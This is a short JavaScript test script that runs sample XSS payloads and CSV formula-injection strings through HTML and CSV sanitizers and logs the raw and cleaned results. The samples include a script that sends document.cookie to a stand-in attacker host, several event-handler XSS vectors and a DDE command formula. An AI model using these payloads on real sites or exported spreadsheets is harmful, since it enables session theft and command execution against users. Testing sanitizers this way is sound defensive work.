const { sanitizeHtml, sanitizeCsvCell } = require('./src/securitySanitizer.js');

console.log('=== RAW EVIDENCE: XSS SANITIZATION (DOMPurify) ===');
const xssPayloads = [
  '<img src=x onerror="alert(document.domain)">',
  '<script>fetch("https://attacker.com?cookie=" + document.cookie)</script>',
  '<a href="javascript:alert(1)">Click Me</a>',
  '<svg onload="alert(1)">',
  '<b>Safe E-Commerce Title:</b> Premium Wireless Earbuds'
];

xssPayloads.forEach((payload, idx) => {
  const clean = sanitizeHtml(payload);
  console.log(`[Payload ${idx + 1} Raw]:  `, payload);
  console.log(`[Payload ${idx + 1} Clean]:`, clean);
  console.log('---');
});

console.log('\n=== RAW EVIDENCE: CSV FORMULA INJECTION DEFENSE ===');
const csvPayloads = [
  '=1+1',
  '=cmd|\' /C calc\'!A0',
  '+1000',
  '-500',
  '@SUM(A1:A10)',
  '\tDDE_LINK',
  'Standard SKU-10928-BLK',
  'Title with "quotes" and commas, pack of 2'
];

csvPayloads.forEach((payload, idx) => {
  const safeCell = sanitizeCsvCell(payload);
  console.log(`[Cell ${idx + 1} Raw]: `, payload);
  console.log(`[Cell ${idx + 1} Safe]:`, safeCell);
  console.log('---');
});
